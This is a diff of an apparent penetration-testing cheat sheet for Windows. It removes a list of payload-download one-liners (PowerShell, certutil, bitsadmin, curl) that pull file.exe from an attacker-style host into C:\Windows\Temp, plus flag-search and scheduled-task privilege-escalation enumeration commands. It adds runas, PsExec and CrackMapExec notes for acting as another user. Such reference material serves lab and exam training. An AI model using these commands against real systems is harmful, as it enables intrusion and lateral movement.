@@ -1,39 +1,9 @@
-## File Transfer
-1.PowerShell WebClient (very common)
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')"
-2.Invoke-WebRequest (IWR) (extremely common)
-powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"
-3.Short version: IWR http://10.10.10.10/file.exe -OutFile C:\Windows\Temp\file.exe
-4.Certutil (very common, often allowed)
-certutil -urlcache -split -f http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
-5.Bitsadmin (classic, still appears often)
-bitsadmin /transfer myjob /download /priority normal http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
-6.Start-BitsTransfer (PowerShell BITS)
-Start-BitsTransfer -Source http://10.10.10.10/file.exe -Destination C:\Windows\Temp\file.exe
-7.Curl (common if curl is installed or on newer Windows)
-curl http://10.10.10.10/file.exe -o C:\Windows\Temp\file.exe
-8. wget (If installed)
-wget -O C:\path\to\file.exe http://example.com/file.exe
-
-## File Search
-#This searches the entire C: drive recursively for the file and lists the full path if found. In Command Prompt:
-dir C:\local.txt /s /b
-#This recursively searches the C: drive, handles errors quietly, and outputs the full file paths. In PowerShell: 
-Get-ChildItem -Path C:\ -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Select-Object FullName 
-#This lists all files recursively and filters for those ending with "local.txt".
-where /R C:\ local.txt
-
-## View Scheduled Tasks
-schtasks /query        Basic List of All Scheduled Tasks
-schtasks /query /fo LIST /v      Detailed List of All Scheduled Tasks
-schtasks /query /fo LIST /v | findstr /i "Run As TaskName Action"      Pipe to findstr to filter
-schtasks /query /fo LIST /v | findstr /i "SYSTEM Administrator"        Search for high-privilege tasks
-Get-ScheduledTask    Powershell list All Tasks
-Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM|Administrator"} | Select TaskName,Principal,Actions      Powershell Combine with filters for privilege escalation hunting
-Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,LastRunTime,NextRunTime,LastTaskResult,NumberOfMissedRuns   Powershell Detailed Task Info 
-Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo    Get information about specific task
-Get-ScheduledTask -TaskName "TaskName" | Select -ExpandProperty Actions      Look for tasks that recently ran or are about to run, and check their actions
-Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object { $_.LastRunTime -gt (Get-Date).AddMinutes(-10) } | Select TaskName, LastRunTime, LastTaskResult, NumberOfMissedRuns    Lists tasks where LastRunTime is within the last 10 minutes.
-Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational -FilterXPath "*[System/TimeCreated[timediff(@SystemTime) <= 600000]] and *[System[(EventID=200 or EventID=201)]]" | Select TimeCreated, Id, Message | Format-List      Queries the Task Scheduler operational log for events in the last 10 minutes (600,000 ms)
 
 
+start-process PowerShell -verb runas   #Upgrade powershell to admin powershell if you have permissions
+runas /user:backupadmin cmd    #Run a command as another user. Helpful if target user doesn’t have GUI access. **Runas can be used with local or domain accounts as long as the user has the ability to log on to the system.
+
+CrackMapExec
+
+If the target user has the Log on as a batch job access right, we can schedule a task to execute a program of our choice as this user. 
+Additionally, if the target user has an active session, we can use PsExec from Sysinternals.
